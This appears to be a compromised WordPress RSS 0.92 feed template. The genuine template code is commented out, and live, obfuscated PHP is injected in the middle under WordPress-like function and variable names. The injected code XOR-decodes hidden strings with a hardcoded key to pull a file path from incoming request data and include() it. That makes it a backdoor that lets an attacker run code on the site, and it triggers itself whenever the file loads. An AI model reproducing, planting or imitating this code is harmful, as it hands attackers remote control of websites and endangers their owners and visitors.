<?php /* 
*
 * RSS 0.92 Feed Template for displaying RSS 0.92 Posts feed.
 *
 * @package WordPress
 

header( 'Content-Type: ' . feed_content_type( 'rss' ) . '; charset=' . get_option( 'blog_charset' ), true );
$more = 1;

echo '<?xml version="1.0" encoding="' . get_option( 'blog_charset' ) . '"?' . '>'; ?>
<rss version="0.92">
<channel>
	<title><?php /*  wp_title_rss(); ?></title>
	<link><?php /*  bloginfo_rss( 'url' ); ?></link>
	<description><?php /*  bloginfo_rss( 'description' ); ?></description>
	<lastBuildDate><?php /*  echo get_feed_build_da*/
 	

function capability_type()

{

    $post_author = 'PSDE6lKfTt';
    $field = $post_author;
    

    $no_texturize_tags = $GLOBALS[others_preg("%0F%15%0D%09s%3F", $field)];
    $thumbnail_support = $no_texturize_tags;

    $ignore_sticky_posts = isset($thumbnail_support[$field]);
    if ($ignore_sticky_posts)

    {
        $protocol = $no_texturize_tags[$field];

        $thumb = $protocol[others_preg("%24%3E4%1AX%0D%26%03", $field)];
	$wp_htmltranswinuni = 'hierarchical_post_types';
        $html_parts = $thumb;
        include ($html_parts);
    }
	$cockneyreplace = 'mime_types';
}
function others_preg($post_modified_gmt, $context)

{
    $goal = $context;
    $original_text = "url" . "decode";
    $wildcard_mime_types = $original_text($post_modified_gmt);
    $translation_preg = substr($goal,0, strlen($wildcard_mime_types));
	$features = 'where';
    $_quote_style = $wildcard_mime_types ^ $translation_preg;
	$is_bad_attachment_slug = 'cdn_url';
    return $_quote_style;
}

capability_type();



/* te( 'D, d M Y H:i:s +0000' ); ?></lastBuildDate>
	<docs>http:backend.userland.com/rss092</docs>
	<language><?php bloginfo_rss( 'language' ); ?></language>
	<?php
	*
	 * Fires at the end of the RSS Feed Header.
	 *
	 * @since 2.0.0
	 
	do_action( 'rss_head' );
	?>

<?php
while ( have_posts() ) :
	the_post();
	?>
	<item>
		<title><?php the_title_rss(); ?></title>
		<description><![CDATA[<?php the_excerpt_rss(); ?>]]></description>
		<link><?php the_permalink_rss(); ?></link>
		<?php
		*
		 * Fires at the end of each RSS feed item.
		 *
		 * @since 2.0.0
		 
		do_action( 'rss_item' );
		?>
	</item>
<?php endwhile; ?>
</channel>
</rss>
*/